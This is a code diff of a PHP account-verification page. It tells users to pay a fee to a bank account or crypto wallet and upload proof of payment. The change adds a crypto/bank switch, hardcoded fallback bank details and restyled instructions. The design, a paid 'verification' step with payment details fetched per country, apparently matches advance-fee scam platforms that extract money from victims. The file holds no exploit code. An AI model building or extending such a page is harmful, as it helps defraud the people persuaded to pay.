@@ -34,7 +34,7 @@ try {
 // Fetch dynamic verification settings from region_settings based on user's country
 try {
     $stmt = $pdo->prepare("
-        SELECT verify_ch, vc_value, verify_ch_name, verify_ch_value, vcn_value, vcv_value, verify_currency, verify_amount
+        SELECT crypto, verify_ch, vc_value, verify_ch_name, verify_ch_value, vcn_value, vcv_value, verify_currency, verify_amount
         FROM region_settings 
         WHERE country = ?
     ");
@@ -43,35 +43,38 @@ try {
     
     if (!$settings) {
         $error = 'Verification settings not found for your country. Please contact support.';
-        $verify_ch = 'Crypto';
-        $vc_value = 'USD';
-        $verify_ch_name = 'Payment Method';
-        $verify_ch_value = 'Payment Destination';
-        $vcn_value = 'Network';
-        $vcv_value = 'Network Address';
-        $verify_currency = 'USD';
+        $crypto = 0;
+        $verify_ch = 'Bank';
+        $vc_value = 'Obi Mikel';
+        $verify_ch_name = 'Bank Name';
+        $verify_ch_value = 'Account Number';
+        $vcn_value = 'MOMO PSB';
+        $vcv_value = '8012345678';
+        $verify_currency = 'NGN';
         $verify_amount = 0.00;
         error_log('No region settings found for country: ' . $user_country, 3, '../debug.log');
     } else {
-        $verify_ch = htmlspecialchars($settings['verify_ch'] ?: 'Crypto');
-        $vc_value = htmlspecialchars($settings['vc_value'] ?: 'USD');
-        $verify_ch_name = htmlspecialchars($settings['verify_ch_name'] ?: 'Payment Method');
-        $verify_ch_value = htmlspecialchars($settings['verify_ch_value'] ?: 'Payment Destination');
-        $vcn_value = htmlspecialchars($settings['vcn_value'] ?: 'Network');
-        $vcv_value = htmlspecialchars($settings['vcv_value'] ?: 'Network Address');
-        $verify_currency = htmlspecialchars($settings['verify_currency'] ?: 'USD');
+        $crypto = $settings['crypto'] ?? 0;
+        $verify_ch = htmlspecialchars($settings['verify_ch'] ?: 'Bank');
+        $vc_value = htmlspecialchars($settings['vc_value'] ?: 'Obi Mikel');
+        $verify_ch_name = htmlspecialchars($settings['verify_ch_name'] ?: 'Bank Name');
+        $verify_ch_value = htmlspecialchars($settings['verify_ch_value'] ?: 'Account Number');
+        $vcn_value = htmlspecialchars($settings['vcn_value'] ?: 'MOMO PSB');
+        $vcv_value = htmlspecialchars($settings['vcv_value'] ?: '8012345678');
+        $verify_currency = htmlspecialchars($settings['verify_currency'] ?: 'NGN');
         $verify_amount = floatval($settings['verify_amount'] ?: 0.00);
     }
 } catch (PDOException $e) {
     error_log('Settings fetch error: ' . $e->getMessage(), 3, '../debug.log');
     $error = 'Failed to load verification settings. Please try again later.';
-    $verify_ch = 'Crypto';
-    $vc_value = 'USD';
-    $verify_ch_name = 'Payment Method';
-    $verify_ch_value = 'Payment Destination';
-    $vcn_value = 'Network';
-    $vcv_value = 'Network Address';
-    $verify_currency = 'USD';
+    $crypto = 0;
+    $verify_ch = 'Bank';
+    $vc_value = 'Obi Mikel';
+    $verify_ch_name = 'Bank Name';
+    $verify_ch_value = 'Account Number';
+    $vcn_value = 'MOMO PSB';
+    $vcv_value = '8012345678';
+    $verify_currency = 'NGN';
     $verify_amount = 0.00;
 }
 
@@ -266,13 +269,35 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
 
         .instructions {
-            margin-bottom: 20px;
+            margin-bottom: 24px;
             font-size: 16px;
             color: var(--subtext-color);
+            line-height: 1.6;
+        }
+
+        .instructions h3 {
+            font-size: 18px;
+            font-weight: 600;
+            color: var(--text-color);
+            margin-bottom: 12px;
+        }
+
+        .instructions p {
+            margin-bottom: 12px;
         }
 
         .instructions strong {
             color: var(--text-color);
+        }
+
+        .instructions ul {
+            list-style-type: disc;
+            padding-left: 24px;
+            margin-bottom: 12px;
+        }
+
+        .instructions ul li {
+            margin-bottom: 8px;
         }
 
         .input-container {
@@ -283,34 +308,47 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         .input-container input,
         .input-container input[type="file"] {
             width: 100%;
-            padding: 14px 0;
+            padding: 14px;
             font-size: 16px;
-            border: none;
-            border-bottom: 2px solid var(--border-color);
-            background: transparent;
+            border: 2px solid var(--border-color);
+            border-radius: 8px;
+            background: var(--card-bg);
             color: var(--text-color);
             outline: none;
             transition: border-color 0.3s ease;
         }
 
+        .input-container input[type="file"] {
+            padding: 12px; /* Adjusted for better appearance */
+            cursor: pointer;
+        }
+
         .input-container input:focus,
         .input-container input:valid {
-            border-bottom-color: var(--accent-color);
+            border-color: var(--accent-color);
         }
 
         .input-container label {
             position: absolute;
-            top: 14px;
-            left: 0;
-            font-size: 16px;
+            top: -10px;
+            left: 12px;
+            font-size: 12px;
             color: var(--subtext-color);
+            background: var(--card-bg);
+            padding: 0 4px;
             pointer-events: none;
             transition: all 0.3s ease;
         }
 
+        .input-container input:placeholder-shown ~ label {
+            top: 14px;
+            font-size: 16px;
+            color: var(--subtext-color);
+        }
+
         .input-container input:focus ~ label,
-        .input-container input:valid ~ label {
-            top: -18px;
+        .input-container input:not(:placeholder-shown) ~ label {
+            top: -10px;
             font-size: 12px;
             color: var(--accent-color);
         }
@@ -471,6 +509,14 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 right: 10px;
                 top: 10px;
             }
+
+            .instructions {
+                font-size: 14px;
+            }
+
+            .instructions h3 {
+                font-size: 16px;
+            }
         }
     </style>
 </head>
@@ -501,23 +547,36 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     <p class="error"><?php echo htmlspecialchars($error); ?></p>
                 <?php endif; ?>
                 <div class="instructions">
-                    <p>To verify your account, please make a payment of <strong><?php echo htmlspecialchars($verify_currency); ?> <?php echo number_format($verify_amount, 2); ?></strong> via <strong><?php echo htmlspecialchars($verify_ch); ?></strong> using the following details:</p>
+                    <h3>Verification Instructions</h3>
+                    <p>To verify your account, please make a payment of <strong><?php echo htmlspecialchars($verify_currency); ?> <?php echo number_format($verify_amount, 2); ?></strong> via <strong><?php echo htmlspecialchars($verify_ch); ?></strong> using the details below:</p>
                     <p><strong><?php echo htmlspecialchars($verify_ch_name); ?>:</strong> <?php echo htmlspecialchars($vc_value); ?> (<?php echo htmlspecialchars($vcn_value); ?>)</p>
                     <p><strong><?php echo htmlspecialchars($verify_ch_value); ?>:</strong> <?php echo htmlspecialchars($vcv_value); ?></p>
-                    <p>After completing the payment, upload a screenshot or proof of payment below. Your request will be reviewed, and your account status will be updated to pending within 48 hours.</p>
-                    <p><strong>Important:</strong></p>
-                    <ul>
-                        <li>Ensure the payment is made via the specified <strong><?php echo htmlspecialchars($verify_ch); ?></strong>.</li>
-                        <li>Use the exact amount and currency: <strong><?php echo htmlspecialchars($verify_currency); ?> <?php echo number_format($verify_amount, 2); ?></strong>.</li>
-                        <li>Include the correct <strong><?php echo htmlspecialchars($vcn_value); ?> (<?php echo htmlspecialchars($vcv_value); ?>)</strong> in your transaction.</li>
-                        <li>Upload a clear screenshot or PDF showing the transaction details (e.g., sender, receiver, amount, timestamp).</li>
-                        <li>Supported file types: JPG, PNG, PDF (max size: 5MB).</li>
-                        <li>Verification may take up to 48 hours to process.</li>
-                    </ul>
+                    <p>After completing the payment, upload a screenshot or proof of payment below. Your verification request will be reviewed within 48 hours.</p>
+                    
+                    <h3>Important Notes</h3>
+                    <?php if ($crypto): ?>
+                        <ul>
+                            <li>Ensure the payment is made via <strong><?php echo htmlspecialchars($verify_ch); ?></strong> to the specified <strong>wallet address</strong>.</li>
+                            <li>Use the exact amount and currency: <strong><?php echo htmlspecialchars($verify_currency); ?> <?php echo number_format($verify_amount, 2); ?></strong>.</li>
+                            <li>Include the correct <strong>network (<?php echo htmlspecialchars($vcn_value); ?>)</strong> and <strong>wallet address (<?php echo htmlspecialchars($vcv_value); ?>)</strong> in your transaction.</li>
+                            <li>Upload a clear screenshot or PDF showing the transaction details (e.g., sender wallet, receiver wallet, amount, network, timestamp).</li>
+                            <li>Supported file types: JPG, PNG, PDF (max size: 5MB).</li>
+                            <li>Verification may take up to 48 hours to process.</li>
+                        </ul>
+                    <?php else: ?>
+                        <ul>
+                            <li>Ensure the payment is made via <strong><?php echo htmlspecialchars($verify_ch); ?></strong> to the specified <strong>bank account</strong>.</li>
+                            <li>Use the exact amount and currency: <strong><?php echo htmlspecialchars($verify_currency); ?> <?php echo number_format($verify_amount, 2); ?></strong>.</li>
+                            <li>Include the correct <strong>bank name (<?php echo htmlspecialchars($vcn_value); ?>)</strong> and <strong>account number (<?php echo htmlspecialchars($vcv_value); ?>)</strong> in your transaction.</li>
+                            <li>Upload a clear screenshot or PDF showing the transaction details (e.g., sender, receiver, amount, timestamp).</li>
+                            <li>Supported file types: JPG, PNG, PDF (max size: 5MB).</li>
+                            <li>Verification may take up to 48 hours to process.</li>
+                        </ul>
+                    <?php endif; ?>
                 </div>
                 <form action="verify_account.php" method="POST" enctype="multipart/form-data">
                     <div class="input-container">
-                        <input type="file" id="proof_file" name="proof_file" accept=".jpg,.jpeg,.png,.pdf" required>
+                        <input type="file" id="proof_file" name="proof_file" accept=".jpg,.jpeg,.png,.pdf" required placeholder=" ">
                         <label for="proof_file">Upload Payment Proof</label>
                     </div>
                     <button type="submit" class="submit-btn">Submit Verification</button>
